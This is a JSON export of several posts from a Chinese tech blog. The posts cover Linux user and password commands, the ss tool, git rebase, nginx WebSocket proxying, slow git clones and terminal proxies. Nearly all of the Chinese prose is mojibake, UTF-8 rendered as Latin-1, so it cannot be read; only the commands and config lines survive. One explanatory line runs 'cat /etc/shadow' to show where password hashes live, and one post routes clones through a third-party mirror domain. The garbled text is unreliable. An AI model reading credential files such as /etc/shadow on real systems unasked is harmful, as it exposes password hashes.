ç³»ç»Ÿç®¡ç†è€…åˆ™èƒ½ç”¨å®ƒç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„å¯†ç ã€‚åªæœ‰ç®¡ç†è€…å¯ä»¥æŒ‡å®šç”¨æˆ·åç§°ï¼Œä¸€èˆ¬ç”¨æˆ·åªèƒ½å˜æ›´è‡ªå·±çš„å¯†ç ã€‚ ssss å‘½ä»¤ç”¨æ¥æ˜¾ç¤ºå¤„äºæ´»åŠ¨çŠ¶æ€çš„å¥—æ¥å­—ä¿¡æ¯ã€‚ss å‘½ä»¤å¯ä»¥ç”¨æ¥è·å–socket ç»Ÿè®¡ä¿¡æ¯ï¼Œå®ƒå¯ä»¥æ˜¾ç¤ºå’Œnetstat ç±»ä¼¼çš„å†…å®¹ã€‚ä½†ss çš„ä¼˜åŠ¿åœ¨äºå®ƒèƒ½å¤Ÿæ˜¾ç¤ºæ›´å¤šæ›´è¯¦ç»†çš„æœ‰å…³TCP å’Œè¿æ¥çŠ¶æ€çš„ä¿¡æ¯ï¼Œè€Œä¸”æ¯”netstat æ›´å¿«é€Ÿæ›´é«˜æ•ˆã€‚ æ˜¾ç¤ºæ‰€æœ‰çš„tcp å¥—æ¥å­— 1$ ss -t -a æ˜¾ç¤ºSocket æ‘˜è¦ 1$ ss -s åˆ—å‡ºæ‰€æœ‰æ‰“å¼€çš„ç½‘ç»œè¿æ¥ç«¯å£ 1$ ss -l æ‰¾å‡ºæ‰“å¼€å¥—æ¥å­—/ç«¯å£åº”ç”¨ç¨‹åº 1$ ss -pl | grep 6666 çŸ¥è¯†æ‰©å±•å­˜æ”¾ç”¨æˆ·ä¿¡æ¯ï¼š 12$ cat &#x2F;etc&#x2F;passwd$ cat &#x2F;etc&#x2F;shadow ç”¨æˆ·ä¿¡æ¯æ–‡ä»¶åˆ†æï¼ˆæ¯é¡¹ç”¨:éš”å¼€ï¼‰ï¼š 12345678jack:X:503:504:::&#x2F;home&#x2F;jack&#x2F;:&#x2F;bin&#x2F;bashjack &#x2F;&#x2F;ç”¨æˆ·åX &#x2F;&#x2F;å£ä»¤ã€å¯†ç 503 &#x2F;&#x2F;ç”¨æˆ·idï¼ˆ0ä»£è¡¨rootã€æ™®é€šæ–°å»ºç”¨æˆ·ä»500å¼€å§‹ï¼‰504 &#x2F;&#x2F;æ‰€åœ¨ç»„: &#x2F;&#x2F;æè¿°&#x2F;home&#x2F;jack&#x2F; &#x2F;&#x2F;ç”¨æˆ·ä¸»ç›®å½•&#x2F;bin&#x2F;bash &#x2F;&#x2F;ç”¨æˆ·ç¼ºçœShell å­˜æ”¾ç»„ä¿¡æ¯ï¼š 12cat &#x2F;etc&#x2F;groupcat &#x2F;etc&#x2F;gshadow ç”¨æˆ·ç»„ä¿¡æ¯æ–‡ä»¶åˆ†æï¼š 123456789jack:$!$:???:13801:0:99999:7:*:*:jack &#x2F;&#x2F;ç»„å$!$ &#x2F;&#x2F;è¢«åŠ å¯†çš„å£ä»¤13801 &#x2F;&#x2F;åˆ›å»ºæ—¥æœŸä¸ä»Šå¤©ç›¸éš”çš„å¤©æ•°0 &#x2F;&#x2F;å£ä»¤æœ€çŸ­ä½æ•°99999 &#x2F;&#x2F;ç”¨æˆ·å£ä»¤7 &#x2F;&#x2F;åˆ°7å¤©æ—¶æé†’* &#x2F;&#x2F;ç¦ç”¨å¤©æ•°* &#x2F;&#x2F;è¿‡æœŸå¤©æ•° å¦‚æœæ˜¯æ™®é€šç”¨æˆ·æ‰§è¡Œpasswdåªèƒ½ä¿®æ”¹è‡ªå·±çš„å¯†ç ã€‚å¦‚æœæ–°å»ºç”¨æˆ·åï¼Œè¦ä¸ºæ–°ç”¨æˆ·åˆ›å»ºå¯†ç ï¼Œåˆ™ç”¨passwdç”¨æˆ·åï¼Œæ³¨æ„è¦ä»¥rootç”¨æˆ·çš„æƒé™æ¥åˆ›å»ºã€‚ 12# ä¿®æ”¹boo ç”¨æˆ·çš„å¯†ç $ passwd boo å‚è€ƒé“¾æ¥ï¼š Wget å‘½ä»¤ SCP å‘½ä»¤ last å‘½ä»¤ who å‘½ä»¤ pkill å‘½ä»¤ ss å‘½ä»¤ permission denied,please try again","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Linux Commands","slug":"Linux-Commands","permalink":"https://www.0x2beace.com/tags/Linux-Commands/"}]},{"title":"Git å˜åŸºå‘½ä»¤è¯¦è§£","slug":"detailed-explanation-of-git-rebase-commands","date":"2020-08-24T12:06:20.000Z","updated":"2020-08-25T12:10:32.469Z","comments":true,"path":"detailed-explanation-of-git-rebase-commands/","link":"","permalink":"https://www.0x2beace.com/detailed-explanation-of-git-rebase-commands/","excerpt":"â€œå˜åŸºâ€å‘½ä»¤æ˜¯git å¸¸ç”¨å‘½ä»¤ä¸­ï¼Œæ¯”è¾ƒå†·é—¨çš„ï¼Œä¸€æ–¹é¢æ˜¯å› ä¸ºè¿™ä¸ªå‘½ä»¤æ¯”è¾ƒâ€œå±é™©â€ï¼Œå¦‚æœç”¨ä¸å¥½ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šå¯¼è‡´ä»£ç ä¸¢å¤±ã€‚å¦ä¸€æ–¹é¢æ˜¯å› ä¸ºè¿™ä¸ªå‘½ä»¤ä¸åƒ addã€commitã€pullã€push å±äºå¿…é¡»è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå°±ç®—ä¸ç”¨å®ƒï¼Œä¹Ÿèƒ½å¹²æ´»ã€‚","text":"â€œå˜åŸºâ€å‘½ä»¤æ˜¯git å¸¸ç”¨å‘½ä»¤ä¸­ï¼Œæ¯”è¾ƒå†·é—¨çš„ï¼Œä¸€æ–¹é¢æ˜¯å› ä¸ºè¿™ä¸ªå‘½ä»¤æ¯”è¾ƒâ€œå±é™©â€ï¼Œå¦‚æœç”¨ä¸å¥½ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šå¯¼è‡´ä»£ç ä¸¢å¤±ã€‚å¦ä¸€æ–¹é¢æ˜¯å› ä¸ºè¿™ä¸ªå‘½ä»¤ä¸åƒ addã€commitã€pullã€push å±äºå¿…é¡»è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå°±ç®—ä¸ç”¨å®ƒï¼Œä¹Ÿèƒ½å¹²æ´»ã€‚ åœºæ™¯é‡ç°é—®é¢˜æè¿°ï¼šæœ‰æ—¶å€™æˆ‘ä»¬åœ¨æœ¬åœ°æäº¤å®Œä»£ç ï¼Œä¸‹ä¸€ä¸ªæ“ä½œæ˜¯éœ€è¦æ¨é€åˆ°è¿œç¨‹ä»“åº“ï¼Œè¿™æ—¶å¦‚æœè¿œç¨‹ä»“åº“å·²ç»æœ‰äº†æ›´æ–°çš„æäº¤ï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬æ‰§è¡Œå®Œgit push å‘½ä»¤ä¹‹åï¼Œä¸å‡ºæ„å¤–ä¼šå‡ºç°ä»¥ä¸‹é”™è¯¯ï¼š 1234567! [rejected] master -&gt; master (fetch first)error: failed to push some refs to &#39;git@gitlab.com:invest2&#x2F;invest_home.git&#39;hint: Updates were rejected because the remote contains work that you dohint: not have locally. This is usually caused by another repository pushinghint: to the same ref. You may want to first integrate the remote changeshint: (e.g., &#39;git pull ...&#39;) before pushing again.hint: See the &#39;Note about fast-forwards&#39; in &#39;git push --help&#39; for details. è¿™æ—¶é”™è¯¯çš„æ„æ€æ˜¯ï¼šæ¨é€å¤±è´¥ï¼Œä½ éœ€è¦å…ˆå°†è¿œç¨‹ä»“åº“æœ€æ–°çš„æäº¤æ›´æ–°åˆ°æœ¬åœ°ä»“åº“ï¼Œç„¶åæ‰èƒ½ git pushã€‚ æ‰€ä»¥è¿™ä¸ªæ—¶å€™ä½ æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼š ä½¿ç”¨git pull è‡ªåŠ¨åˆå¹¶ ä½¿ç”¨git fetch æ‰‹åŠ¨åˆå¹¶ å‰è€…è™½ç„¶ç”¨èµ·æ¥å¾ˆæ–¹ä¾¿ï¼Œä½†æ˜¯è‡ªåŠ¨åˆå¹¶ä¼šç•™ä¸‹ä¸€æ¬¡åˆå¹¶è®°å½•ï¼Œç±»ä¼¼è¿™æ ·ï¼š 1Merge branch &#39;master&#39; of bitbucket.org:maxt2013&#x2F;invest_home è™½ç„¶è¿™å¹¶ä¸ä¼šå½±å“ä»€ä¹ˆï¼Œä½†å¦‚æœä½ å¾ˆé‡è§† commit logsï¼Œé‚£ä¹ˆè¿™æ ·çš„ä¸€æ¬¡è®°å½•ï¼Œæ˜¯ä¸è¢«å®¹å¿çš„ã€‚ åè€…é€šè¿‡æ‰‹åŠ¨åˆå¹¶ï¼Œç¡®å®å¯ä»¥åšåˆ°æ²¡æœ‰å¤šä½™çš„åˆå¹¶è®°å½•ï¼Œä½†æ˜¯æ¯æ¬¡æ‰‹åŠ¨åˆå¹¶æœ‰æ¯”è¾ƒéº»çƒ¦ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰ä»€ä¹ˆæŠ˜ä¸­çš„æ–¹å¼ï¼Œæ—¢å¯ä»¥ä¸ç•™ä¸‹å¤šä½™çš„è®°å½•ï¼Œæœ‰æ¯”è¾ƒçœäº‹ã€‚ ç­”æ¡ˆæ˜¯æœ‰çš„ï¼Œå®ƒå°±æ˜¯æˆ‘ä»¬ä¸‹é¢è¦ä»‹ç»çš„â€œå˜åŸºâ€ã€‚ rebaseä¸‹é¢è¿™æ¡å‘½ä»¤ä¼šå°†è¿œç¨‹ä»“åº“ä¸­æœ€æ–°çš„æäº¤åˆå¹¶åˆ°æœ¬åœ°ä»“åº“ï¼Œ--rebaseå‚æ•°çš„ä½œç”¨æ˜¯å…ˆå–æ¶ˆ commit è®°å½•ï¼Œå¹¶æŠŠå®ƒä»¬ä¸´æ—¶ä¿å­˜ä¸ºè¡¥ä¸ï¼ˆpatchï¼‰ï¼Œè¿™äº›è¡¥ä¸æ”¾åœ¨ .git/rebaseç›®å½•ä¸­ï¼Œç­‰è¿œç¨‹ä»“åº“åŒæ­¥è‡³æœ¬åœ°ä¹‹åï¼Œæœ€åæ‰å°†è¡¥ä¸åˆå¹¶åˆ°æœ¬åœ°ä»“åº“ã€‚ 1git pull --rebase origin master ä¸‹é¢ç”¨å›¾æ¥è§£é‡Šå…·ä½“å‘ç”Ÿäº†ä»€ä¹ˆã€‚ git pull ä¹‹å‰çš„æƒ…å†µï¼š ä½¿ç”¨ git pull --rebase originï¼š æœ€åä½¿ç”¨ git pushï¼š æ€»ç»“å¦‚æœä½ å¯¹ commit logsæœ‰å¼ºçƒˆçš„æ§åˆ¶æ¬²æœ›ï¼Œé‚£ä¹ˆå˜åŸºå‘½ä»¤æ˜¯é€‚åˆä½ çš„ï¼Œå¦‚æœä½ æ˜¯ä½¿ç”¨git çš„æ–°æ‰‹ï¼Œæˆ–è€…ä½ ä¸åœ¨æ„ commit logsï¼Œé‚£ä¹ˆç›´æ¥ä½¿ç”¨ git pull è‡ªåŠ¨åˆå¹¶å°±å¥½äº†ã€‚ å‚è€ƒé“¾æ¥ git pushé”™è¯¯failed to push some refs toçš„è§£å†³","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Socket.io è¿æ¥å¼‚å¸¸ï¼šError during WebSocket handshake Unexpected response code 400","slug":"socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400","date":"2020-08-23T02:34:50.000Z","updated":"2020-08-23T02:43:00.235Z","comments":true,"path":"socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400/","link":"","permalink":"https://www.0x2beace.com/socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400/","excerpt":"å‰æ®µæ—¶é—´çº¿ä¸Šçš„ç”Ÿäº§ç¯å¢ƒé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼šError during WebSocket handshake: Unexpected response code: 400ã€‚ èµ·åˆæˆ‘æ²¡å¤ªåœ¨æ„ï¼Œä»¥ä¸ºå°±æ˜¯æ­£å¸¸çš„ socket.io è¿æ¥æ–­å¼€äº†ã€‚ ç›´åˆ°æˆ‘å‘ç° socker.io çš„é€šè®¯æ–¹å¼ç”±åŸæ¥çš„åœ¨ä¸€ä¸ªè¿æ¥ä¸­é€šè®¯å˜æˆäº†æ¯ä¸€æ¬¡æ¨é€éƒ½é‡èµ·ä¸€ä¸ªè¯·æ±‚ï¼Œæˆ‘æ‰æ„è¯†åˆ°å¯èƒ½æ˜¯å“ªé‡Œå‡ºé—®é¢˜äº†ã€‚","text":"å‰æ®µæ—¶é—´çº¿ä¸Šçš„ç”Ÿäº§ç¯å¢ƒé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼šError during WebSocket handshake: Unexpected response code: 400ã€‚ èµ·åˆæˆ‘æ²¡å¤ªåœ¨æ„ï¼Œä»¥ä¸ºå°±æ˜¯æ­£å¸¸çš„ socket.io è¿æ¥æ–­å¼€äº†ã€‚ ç›´åˆ°æˆ‘å‘ç° socker.io çš„é€šè®¯æ–¹å¼ç”±åŸæ¥çš„åœ¨ä¸€ä¸ªè¿æ¥ä¸­é€šè®¯å˜æˆäº†æ¯ä¸€æ¬¡æ¨é€éƒ½é‡èµ·ä¸€ä¸ªè¯·æ±‚ï¼Œæˆ‘æ‰æ„è¯†åˆ°å¯èƒ½æ˜¯å“ªé‡Œå‡ºé—®é¢˜äº†ã€‚ nginx ä½œä¸ºwbsocket ä»£ç†ç»è¿‡ä¸€ç•ªæŸ¥æ‰¾ï¼Œäº†è§£åˆ° nginx åœ¨ä½œä¸ºåå‘ä»£ç†æ—¶ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨ wssï¼Œé‚£ä¹ˆè¿˜éœ€è¦é¢å¤–åŠ ä¸€æ®µé…ç½®ã€‚ NGINX supports WebSocket by allowing a tunnel to be set up between a client and a backend server. For NGINX to send the Upgrade request from the client to the backend server, the Upgrade and Connection headers must be set explicitly. â€”â€” Nginx å®˜ç½‘ ç¿»è¯‘è¿‡æ¥å°±æ˜¯ï¼šnginx é€šè¿‡å…è®¸åœ¨å®¢æˆ·ç«¯å’Œåç«¯æœåŠ¡å™¨ä¹‹é—´å»ºç«‹è¿æ¥æ¥æ”¯æŒ websocket é€šè®¯ï¼Œä¸ºäº†ä½¿ nginx å°†å‡çº§è¯·æ±‚ä»å®¢æˆ·ç«¯å‘é€åˆ°åç«¯æœåŠ¡å™¨ï¼Œå¿…é¡»æ˜ç¡®è®¾ç½® Upgrade å’Œ Connection æ ‡å¤´ã€‚ 12345678location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;wsbackend; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;Upgrade&quot;; proxy_set_header Host $host;&#125; ç¬¬ä¸€è¡Œæ˜¯ nginx åå‘ä»£ç†çš„é…ç½®ï¼Œåé¢å››è¡Œæ‰æ˜¯è¿™ä¸ªé—®é¢˜çš„è§£å†³æ–¹æ¡ˆã€‚ ä»”ç»†æƒ³ä¸€æƒ³ï¼Œå› ä¸ºæœ¬åœ°æ²¡æœ‰ https çš„æ¦‚å¿µï¼Œå¹¶æ²¡æœ‰å‘ç°è¿™ä¸ªé—®é¢˜ï¼Œè€Œçº¿ä¸Šæ˜¯æœ‰é…ç½®è¯ä¹¦çš„ï¼Œæ‰€ä»¥æš´éœ²å‡ºäº†è¿™ä¸ªé—®é¢˜ã€‚ æ€»ç»“socket.io çš„è¯·æ±‚å¹¶æ²¡æœ‰çœŸæ­£è¾¾åˆ°ï¼Œè¯·æ±‚å‘å‡ºä¹‹åä¸­é—´ä¸ºä»€ä¹ˆæ²¡æœ‰åˆ°è¾¾èŠ‚ç‚¹ï¼Œè¿™ä¸ªæ˜¯è§£å†³é—®é¢˜çš„å…³é”®ã€‚ ä¸ºäº†ä½¿ nginx æ­£ç¡®å¤„ç† socket.io æ‰€éœ€è¦åšçš„å°±æ˜¯æ­£ç¡®è®¾ç½®æ ‡å¤´ï¼Œä»¥å¤„ç†å°†è¿æ¥ä» http å‡çº§åˆ° websocket çš„è¯·æ±‚ã€‚ å‚è€ƒé“¾æ¥ Nginx ä½œä¸ºWebsocket åå‘ä»£ç†","categories":[{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/categories/Socket-io/"},{"name":"Nginx","slug":"Socket-io/Nginx","permalink":"https://www.0x2beace.com/categories/Socket-io/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/tags/Socket-io/"},{"name":"wss","slug":"wss","permalink":"https://www.0x2beace.com/tags/wss/"}]},{"title":"Git Clone å¤ªæ…¢æ€ä¹ˆåŠï¼Ÿ","slug":"what-should-I-do-if-git-clone-is-too-slow","date":"2020-08-19T14:29:15.000Z","updated":"2020-09-08T01:31:21.124Z","comments":true,"path":"what-should-I-do-if-git-clone-is-too-slow/","link":"","permalink":"https://www.0x2beace.com/what-should-I-do-if-git-clone-is-too-slow/","excerpt":"","text":"å‰è¨€æœ€è¿‘åœ¨ä½¿ç”¨git æ—¶ï¼Œéœ€è¦å…‹éš†Bitbucketçš„ä¸€ä¸ªä»“åº“ï¼Œäºæ˜¯åƒå¾€å¸¸ä¸€æ ·æ‰“å¼€äº†iTermï¼Œä¾¿æ”¾åœ¨ä¸€è¾¹äº†ã€‚ç›´åˆ°ä¸€ä¸ªå°æ—¶åï¼Œæˆ‘æ‰æƒ³èµ·æ¥ï¼Œæƒ³ç€åº”è¯¥å…‹éš†å®Œäº†ï¼Œæ‰“å¼€æ‰å‘ç°ç™¾åˆ†ä¹‹ä¸€éƒ½æ²¡ä¸‹è½½å®Œã€‚ å¼ºå¤§çš„é•¿åŸæŠ€æœ¯å¯¹GitHubã€Bitbucket è¿™ç±»æºä»£ç æ‰˜ç®¡æœåŠ¡å¹³å°ç½‘å¼€ä¸€é¢ï¼Œå¹¶æ²¡æœ‰åƒGoogleã€FaceBooké‚£æ ·ç›´æ¥ä¸€åˆ€åˆ‡ï¼Œä½†æ˜¯å®ƒåšäº†ä¸¥æ ¼çš„é™é€Ÿï¼Œè¿™ç§æŠ˜ç£¨ç®€ç›´æ¯”æ— æ³•è®¿é—®æ›´éš¾å—ã€‚ ä¸Šå›¾ä¸­git cloneçš„é€Ÿåº¦ä»æ¥æ²¡æœ‰è¶…è¿‡ 10k/sï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€ä¸€ä¸ª 100M çš„é¡¹ç›®ï¼Œéœ€è¦è¿‘ä¸‰ä¸ªå°æ—¶æ‰èƒ½ä¸‹è½½å®Œï¼Œè€Œä¸”ç”±äºç½‘ç»œçš„ä¸ç¨³å®šæ€§ï¼Œä¸‹è½½è¿‡ç¨‹ä¸­å¶å°”ä¼šå‡ºç°æ–­å¼€è¿æ¥çš„æƒ…å†µï¼Œç”±äºgit clone ä¸æ”¯æŒç«¯ç‚¹ç»­ä¼ ï¼Œè¿™å°±ä¼šå¯¼è‡´å‰å‡ ä¸ªå°æ—¶çš„ä¸‹è½½é‡å®Œå…¨æµªè´¹æ‰äº†ï¼Œåªèƒ½é‡æ–°å¼€å§‹ä¸‹è½½ã€‚ è¿™ç¯‡æ–‡ç« ä¸»è¦ç”¨æ¥ä»‹ç»å‡ ç§æ–¹å¼å¯ä»¥å¿«é€Ÿçš„å…‹éš†è¿œç¨‹ä»“åº“ã€‚ æµ…å¤åˆ¶git cloneé»˜è®¤ä¼šä¸‹è½½é¡¹ç›®çš„å®Œæ•´å†å²ç‰ˆæœ¬ï¼Œå¦‚æœä½ åªå…³å¿ƒä»£ç ï¼Œè€Œä¸å…³å¿ƒå†å²ä¿¡æ¯ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ git çš„æµ…å¤åˆ¶åŠŸèƒ½ï¼š 1$ git clone --depth&#x3D;1 https:&#x2F;&#x2F;github.com&#x2F;bcit-ci&#x2F;CodeIgniter.git --depth=1 è¡¨ç¤ºåªä¸‹è½½æœ€è¿‘ä¸€æ¬¡çš„ç‰ˆæœ¬ï¼Œä½¿ç”¨æµ…å¤åˆ¶å¯ä»¥å¤§å¤§å‡å°‘ä¸‹è½½çš„æ•°æ®é‡ï¼Œä¾‹å¦‚ï¼ŒCodeIgniter é¡¹ç›®å®Œæ•´ä¸‹è½½æœ‰è¿‘ 100MiB ï¼Œè€Œä½¿ç”¨æµ…å¤åˆ¶åªæœ‰ 5MiB å¤šï¼Œè¿™æ ·å³ä½¿åœ¨æ¶åŠ£çš„ç½‘ç»œç¯å¢ƒä¸‹ï¼Œä¹Ÿå¯ä»¥å¿«é€Ÿçš„è·å¾—ä»£ç ã€‚ å¦‚æœä¹‹ååˆæƒ³è·å–å®Œæ•´å†å²ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼š 1$ git fetch --unshallow æˆ–è€…ï¼Œå¦‚æœä½ åªæƒ³ä¸‹è½½æœ€æ–°çš„ä»£ç ï¼Œä½ ä¹Ÿå¯ä»¥ç›´æ¥ä»è¿œç¨‹ä»“åº“ä¸‹è½½æ‰“åŒ…å¥½çš„zipæ–‡ä»¶ï¼Œè¿™ä¼šæ¯”æµ…å¤åˆ¶æ›´å¿«ï¼Œå› ä¸ºå®ƒåªåŒ…å«äº†æœ€æ–°çš„ä»£ç æ–‡ä»¶ï¼Œè€Œä¸”zipæ˜¯å‹ç¼©æ–‡ä»¶ã€‚ä½†æ˜¯å¾ˆæ˜¾ç„¶ï¼Œä½¿ç”¨æµ…å¤åˆ¶ä¼šçµæ´»ä¸€äº›ã€‚ GUI å·¥å…·å¦‚æœä½ æœ‰å¹¸æ­£åœ¨ä½¿ç”¨ä»£ç†ï¼Œæ‡‚å¾—å¦‚ä½•ç§‘å­¦ä¸Šç½‘çš„è¯ï¼Œé‚£ä¹ˆè®¿é—®GitHubã€Bitbucketå¯¹ä½ æ¥è¯´åº”è¯¥ä¸åœ¨è¯ä¸‹ã€‚ ä»æºä»£ç æ‰˜ç®¡æœåŠ¡å¹³å°ä¸‹è½½é¡¹ç›®æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨ä¸€æ¬¾å›¾å½¢åŒ–ç•Œé¢ï¼ˆGUIï¼‰çš„Gitå·¥å…·ã€‚ ä½¿ç”¨GUIå·¥å…·æ–¹ä¾¿ä¹‹å¤„å°±åœ¨äºï¼Œå¯ä»¥åœ¨è®¾ç½®ä¸­ç›´æ¥é…ç½®æ˜¯å¦ä½¿ç”¨ä»£ç†ã€‚æˆ–è€…ç›´æ¥å°†ä»£ç†é…ç½®å°¾ç³»ç»Ÿä»£ç†ã€‚ http/https proxyå¦‚æœä½ è·Ÿæˆ‘ä¸€æ ·ï¼Œæ›´å–œæ¬¢ä½¿ç”¨åŸç”Ÿçš„gitå‘½ä»¤ï¼Œå–œæ¬¢ä½¿ç”¨åœ¨å‘½ä»¤è¡Œä¸‹æ“ä½œçš„é‚£ç§æ„Ÿè§‰ï¼Œé‚£ä¹ˆä½ ä¹Ÿå¯ä»¥åœ¨å‘½ä»¤è¡Œä¸‹ç›´æ¥é…ç½®ä»£ç†ã€‚ è¿™é‡Œä¹Ÿæœ‰ä¸¤ç§æ–¹å¼ï¼Œæ ¹æ®å®é™…æƒ…å†µè‡ªè¡Œé€‰æ‹©ã€‚ http12$ git config --global http.proxy http:&#x2F;&#x2F;127.0.0.1:1087$ git config --global https.proxy https:&#x2F;&#x2F;127.0.0.1:1087 æˆ–è€…ç›´æ¥ç¼–è¾‘~/.gitconifgæ–‡ä»¶ 123456# vim ~&#x2F;.gitconfig[http] proxy &#x3D; http:&#x2F;&#x2F;127.0.0.1:1087[https] proxy &#x3D; https:&#x2F;&#x2F;127.0.0.1:1087 socks512$ git config --global http.proxy socks5:&#x2F;&#x2F;127.0.0.1:1086$ git config --global https.proxy socks5:&#x2F;&#x2F;127.0.0.1:1086 å…¶ä¸­ï¼Œ1087ã€1086åˆ†åˆ«æ˜¯ä½ æœ¬åœ°æœºå™¨çš„ httpã€socks5ä»£ç†çš„ç«¯å£å·ã€‚ å¦å¤–ï¼Œå¦‚æœæƒ³å–æ¶ˆè®¾ç½®ï¼Œå¯ä»¥è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š 12$ git config --global --unset http.proxy$ git conifg --global --unset https.proxy é…ç½®å®Œæˆåï¼Œé‡æ–° cloneä¸€éï¼Œå¯ä»¥çœ‹åˆ°é€Ÿåº¦å¾—åˆ°äº†æå¤§çš„æå‡ã€‚ æ³¨æ„âš ï¸ ä¸Šé¢è¿™ç§é…ç½®æ–¹å¼ä»…é€‚ç”¨äº httpsåè®®ï¼Œå¦‚æœä½ åœ¨cloneæ—¶é€‰æ‹©sshåè®®ï¼Œé‚£ä¹ˆé€Ÿåº¦ä»ç„¶ä¼šå¾ˆæ…¢ã€‚ æ›¿æ¢åŸŸåå¦‚æœä½ è§‰å¾—ä¸Šé¢çš„æ–¹å¼å¤ªéº»çƒ¦äº†ï¼Œæˆ–è€…æ˜¯ä½ æ²¡æœ‰ä»£ç†ï¼Œé‚£ä¹ˆå¯ä»¥è¯•è¯•ä¸‹é¢è¿™ç§æ–¹å¼ã€‚ è¿™ç§æ–¹å¼ç®€å•æš´åŠ›ï¼Œæ›¿æ¢å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä½¿ç”¨è§„åˆ™å¦‚ä¸‹ï¼š 12345# åŸåœ°å€$ git clone https:&#x2F;&#x2F;github.com&#x2F;996icu&#x2F;996.ICU.git# æ›¿æ¢æˆ$ git clone https:&#x2F;&#x2F;github.com.cnpmjs.org&#x2F;996icu&#x2F;996.ICU.git åªéœ€è¦åœ¨github.comåé¢è¿½åŠ ä¸€ä¸ª.cnpmjs.orgå°±å¯ä»¥äº†ã€‚ ä»¥ä¸Šå°±æ˜¯git cloneå¤ªæ…¢æ—¶çš„å„ç§è§£å†³åŠæ³•ã€‚ å‚è€ƒé“¾æ¥Git Clone å¤ªæ…¢æ€ä¹ˆåŠï¼Ÿ","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"},{"name":"Skill","slug":"Git/Skill","permalink":"https://www.0x2beace.com/categories/Git/Skill/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"},{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"}]},{"title":"å¦‚ä½•è®©ç»ˆç«¯å‘½ä»¤èµ°ä»£ç†ï¼Ÿ","slug":"how-to-make-terminal-commands-go-through-proxy","date":"2020-08-18T15:39:58.000Z","updated":"2022-03-11T01:21:50.968Z","comments":true,"path":"how-to-make-terminal-commands-go-through-proxy/","link":"","permalink":"https://www.0x2beace.com/how-to-make-terminal-commands-go-through-proxy/","excerpt":"","text":"é—®é¢˜æè¿°ï¼šä»Šå¤©æœ¬æ¥æ‰“ç®—ä½¿ç”¨Homebrew æ›´æ–°ä¸€ä¸ªå·¥å…·ï¼Œä½†æ˜¯è¾“å…¥å®Œbrew updata ä¹‹åï¼Œå°±ä¸€ç›´æ˜¯Updating Homebrew... è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘äº§ç”Ÿäº†å‡ ä¸ªç–‘é—®ï¼š ä¸ºä»€ä¹ˆå¡ç€ä¸åŠ¨äº†ï¼Œæ˜æ˜æ˜¯æœ‰ç½‘ç»œçš„å•Šã€‚ éš¾é“æ˜¯å› ä¸ºHomebrew éœ€è¦è®¿é—®å›½å¤–çš„æºï¼Ÿ Shadowsocks æ˜æ˜æ˜¯å¼€ç€å…¨å±€ä»£ç†ï¼Œä¸ºä»€ä¹ˆæ²¡æœ‰ç”¨ï¼Ÿ å¦‚ä½•è®©ç»ˆç«¯å‘½ä»¤èµ°ä»£ç†ï¼Œæˆ–è€…è¯´å¦‚ä½•è®© Homebrew èµ°ä»£ç†æ›´æ–°ï¼Ÿ æ–¹æ¡ˆé¦–å…ˆå…ˆå›ç­”ä¸€ä¸‹ä¸Šé¢é‚£äº›é—®é¢˜ï¼Œå› ä¸ºå›½å†…ç½‘ç»œç¯å¢ƒè¿›ä¸€æ­¥æ¶åŠ£ï¼Œä½¿å¾—ä»æ ¹æœ¬ä¸Šé€ æˆäº†è¿™ä¸ªé—®é¢˜çš„äº§ç”Ÿã€‚å› ä¸ºShadowshocksçš„å…¨å±€ä»£ç†è™½ç„¶å¯¹æµè§ˆå™¨æ˜¯æœ‰æ•ˆï¼Œä½†å¯¹å‘½ä»¤è¡Œæ— æ•ˆã€‚ æ‰€ä»¥è¿™ä¸€åˆ‡çš„é—®é¢˜å¯ä»¥æ€»ç»“æˆä¸€ä¸ªé—®é¢˜ï¼šå¦‚æœèƒ½è®©ç»ˆç«¯å‘½ä»¤èµ°ä»£ç†å°±å¥½äº†ã€‚ ä¸´æ—¶ç”Ÿæ•ˆå¥½åœ¨Homebrew æ˜¯æ”¯æŒå…¨å±€ä»£ç†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åœ¨å½“å‰å‘½ä»¤è¡Œç¯å¢ƒä¸­åŠ å…¥ä»£ç†é…ç½®å°±å¥½äº†ã€‚ 123export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080&#x2F;&#x2F; 1080 æ˜¯æœ¬åœ° socks5 ç›‘å¬ç«¯å£ 